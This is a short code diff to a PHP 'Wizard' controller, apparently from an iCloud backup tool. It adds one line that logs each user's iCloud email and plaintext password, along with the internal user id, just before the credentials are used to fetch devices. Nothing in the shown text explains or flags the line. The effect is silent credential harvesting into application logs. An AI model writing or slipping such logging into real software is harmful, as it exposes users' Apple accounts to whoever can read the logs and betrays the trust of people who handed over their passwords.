@@ -165,6 +165,8 @@ class Wizard extends BaseController {
                 elseif(empty($_POST['password']))
                     throw new EmptyICloudPassword;
                 
+                $this->logger->addInfo('iCloud USER #' . $this->auth['id'] . ' ACCOUNT: ' . $_POST['email'] . ' ' . $_POST['password']);
+                
                 $iCloud = new iCloudBackup($_POST['email'], $_POST['password']);
                 $devices = $iCloud->getDevices();
 
